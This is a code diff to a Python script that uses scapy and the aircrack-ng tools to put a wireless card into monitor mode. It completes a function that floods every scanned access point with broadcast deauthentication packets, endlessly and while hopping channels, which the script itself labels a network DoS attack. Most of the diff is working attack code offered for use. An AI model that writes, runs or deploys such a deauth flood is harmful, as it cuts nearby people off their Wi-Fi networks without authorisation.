@@ -26,7 +26,6 @@ import subprocess
 
 import time
 
-import signal
 from threading import Thread
        
 #-----------------------------------------------------------------------------------------------------    
@@ -140,7 +139,7 @@ def monitormode():
 #function for a cleanup. turns off mon mode and resets everything, makes it look nice as well with a flashy shutdown screen
 
 def cleanup(): #after scanning and all, in order for mon mode to be deactivated and for a summary
-    print("[{y}!{c}] DISABLING {b}MONITOR{c} MODE...".format(y=yellow,b=blue, c=clear))
+    print("\n[{y}!{c}] DISABLING {b}MONITOR{c} MODE...".format(y=yellow,b=blue, c=clear))
     subprocess.check_output("airmon-ng check kill", shell=True)
     
     exit("[{b}LOG{p}OFF{c}]...".format(b=blue, p=purple, c=clear))
@@ -164,9 +163,10 @@ def channelhopper():
         subprocess.check_output("iwconfig mon0 channel " + str(channel), shell=True)
         time.sleep(0.2)
 
-#not done yet, but planning to deauth all scanned ap bssids
+#finally done, broadcasts deauth packets to all scanned aps forever whilst also channel hopping
 def deauth_attack():
     BROADCAST = "FF:FF:FF:FF:FF:FF"
+    
     verboselog = False
     is_verbose = input("VERBOSE? (y/n) ")
     
@@ -175,17 +175,18 @@ def deauth_attack():
 
     input("BEGIN NETWORK DOS DEAUTH ATTACK?\nPRESS [ENTER]...")
 
-    #starts channelhopper func as daemon to have packets consistently sent out across all channels
+    #starts channelhopper func as daemon to have packets consistently sent out across all channels   
     chop = Thread(target=channelhopper(), args=[])
     chop.daemon = True
     chop.start()
-    
+
     while True:    
         for bssid in AP_BSSID:
             pkt = RadioTap() / Dot11(addr1=BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
             sendp(pkt, iface="mon0", count=10, verbose=False)
             if verboselog == True:
                 print("packet sent to " + bssid)
+            
 #-----------------------------------------------------------------------------------------------------
 #if run with python3
 if __name__ == "__main__":
@@ -196,4 +197,7 @@ if __name__ == "__main__":
     startscreen()
     monitormode()
     mainsniffer()
-    deauth_attack()
+    try:
+        deauth_attack()
+    except KeyboardInterrupt:
+        cleanup()
